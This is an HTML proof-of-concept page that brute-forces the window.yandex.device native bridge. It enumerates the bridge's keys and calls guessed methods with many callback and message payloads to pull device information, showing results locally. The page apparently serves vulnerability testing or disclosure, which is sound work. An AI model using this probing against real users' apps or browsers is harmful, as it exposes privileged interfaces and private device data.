<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>PoC - window.yandex.device getDeviceInfo autodiscovery</title>

  <style>
    body {
      font-family: sans-serif;
      padding: 16px;
    }
    h1 {
      margin: 0 0 8px 0;
    }
    pre {
      white-space: pre-wrap;
      word-break: break-word;
      background: #111;
      color: #0f0;
      padding: 12px;
      border-radius: 8px;
    }
    button {
      font-size: 16px;
      padding: 10px 14px;
      margin: 8px 8px 8px 0;
    }
  </style>
</head>

<body>
  <h1>Device Bridge PoC</h1>
  <div>
    Autodetect + invoke <code>window.yandex.device</code>
    (callback / promise / message)
  </div>
  <div>TS: <span id="ts"></span></div>

  <button onclick="run()">Run</button>
  <pre id="out">Ready.</pre>

  <script>
    (function () {
      document.getElementById("ts").textContent = String(Date.now());
    })();

    function out(s) {
      const el = document.getElementById("out");
      el.textContent += s + "\n";
    }

    function setOut(s) {
      document.getElementById("out").textContent = s + "\n";
    }

    function safe(v) {
      try {
        if (v === undefined) return "undefined";
        if (v === null) return "null";
        if (typeof v === "string") return JSON.stringify(v);
        if (typeof v === "number" || typeof v === "boolean") return String(v);
        if (typeof v === "function")
          return "[function " + (v.name || "anonymous") + "]";
        return String(v);
      } catch (e) {
        return "[unprintable:" + e + "]";
      }
    }

    function j(o) {
      try {
        return JSON.stringify(o);
      } catch (e) {
        return "[json_fail:" + e + "]";
      }
    }

    function ownKeys(o) {
      try {
        return Reflect.ownKeys(o);
      } catch (e) {
        return ["<ownKeys error " + e + ">"];
      }
    }

    function once(fn) {
      let done = false;
      return function () {
        if (done) return;
        done = true;
        return fn.apply(this, arguments);
      };
    }

    async function tryCall(fn, thisObj, args, label) {
      try {
        const r = fn.apply(thisObj, args);

        if (r && typeof r.then === "function") {
          const v = await r;
          out("[OK] " + label + " (promise) => " + safe(v));
          return { ok: true, value: v };
        }

        out("[OK] " + label + " => " + safe(r));
        return { ok: true, value: r };
      } catch (e) {
        out("[EX] " + label + " threw: " + e);
        return { ok: false, error: e };
      }
    }

    async function run() {
      setOut("");

      // 1) Confirm window.yandex exists
      let y;
      try {
        y = window.yandex;
      } catch (e) {
        out("ERROR reading window.yandex: " + e);
        y = undefined;
      }

      out("typeof window.yandex=" + typeof y + " " + safe(y));
      if (!y) {
        alert("No window.yandex");
        return;
      }

      // 2) Confirm device object
      let d;
      try {
        d = y.device;
      } catch (e) {
        out("ERROR reading y.device: " + e);
        d = undefined;
      }

      out(
        "typeof window.yandex.device=" + typeof d + " " + safe(d)
      );
      if (!d) {
        alert("No yandex.device bound");
        return;
      }

      // 3) Enumerate keys + proto keys
      const dKeys = ownKeys(d);
      out("ownKeys(device)=" + j(dKeys));

      let proto;
      try {
        proto = Object.getPrototypeOf(d);
      } catch (e) {
        proto = null;
      }

      const pKeys = proto ? ownKeys(proto) : [];
      out("ownKeys(device.__proto__)=" + j(pKeys));

      // 4) Build candidate function names
      const candidates = [
        "getDeviceInfo",
        "deviceInfo",
        "getInfo",
        "info",
        "get",
        "fetch",
        "query",
        "postMessage",
        "send",
        "invoke",
        "call",
        "callNative",
        "callDirective",
      ];

      // Also include any discovered function-valued keys
      const discoveredFns = [];

      for (const k of dKeys) {
        try {
          if (typeof d[k] === "function")
            discoveredFns.push(String(k));
        } catch (e) {}
      }

      for (const k of pKeys) {
        try {
          if (typeof d[k] === "function")
            discoveredFns.push(String(k));
        } catch (e) {}
      }

      const uniq = [];
      function addName(n) {
        if (n && !uniq.includes(n)) uniq.push(n);
      }

      candidates.forEach(addName);
      discoveredFns.forEach(addName);

      out("candidate functions=" + j(uniq));

      // 5) Callback-style calls
      const cb = once(function (res) {
        out("** CALLBACK RESULT ** " + safe(res));

        try {
          if (typeof res === "string") {
            const parsed = JSON.parse(res);
            out("parsed JSON=" + j(parsed));
          }
        } catch (e) {
          out("parse JSON failed: " + e);
        }

        alert(("DeviceInfo: " + safe(res)).slice(0, 300));
      });

      const cbArgsSets = [
        [cb],
        [{ callback: cb }],
        [{ onResult: cb }],
        [{ success: cb }],
        [{ complete: cb }],
        [{}, cb],
      ];

      for (const name of uniq) {
        let fn;
        try {
          fn = d[name];
        } catch (e) {
          continue;
        }

        if (typeof fn !== "function") continue;

        for (let i = 0; i < cbArgsSets.length; i++) {
          await tryCall(
            fn,
            d,
            cbArgsSets[i],
            "device." + name + " callbackArgs#" + i
          );
        }

        await tryCall(fn, d, [], "device." + name + "()");
      }

      // 6) Message-style APIs
      const msgNames = [
        "postMessage",
        "send",
        "invoke",
        "call",
        "callDirective",
      ];

      for (const mn of msgNames) {
        let m;
        try {
          m = d[mn];
        } catch (e) {
          continue;
        }

        if (typeof m !== "function") continue;

        const payloads = [
          { cmd: "getDeviceInfo" },
          { method: "getDeviceInfo" },
          { action: "getDeviceInfo" },
          { type: "getDeviceInfo" },
          { name: "getDeviceInfo" },
          "getDeviceInfo",
          ["getDeviceInfo"],
          { namespace: "device", cmd: "getDeviceInfo" },
        ];

        for (let i = 0; i < payloads.length; i++) {
          await tryCall(
            m,
            d,
            [payloads[i], cb],
            "device." + mn + " payload#" + i
          );

          await tryCall(
            m,
            d,
            [payloads[i]],
            "device." + mn + " payload#" + i + " (no cb)"
          );
        }
      }

      out(
        "DONE. If no callback/alert fired, device bridge may be origin-gated or require a different signature."
      );
      alert("Done. Check output.");
    }
  </script>
</body>
</html>
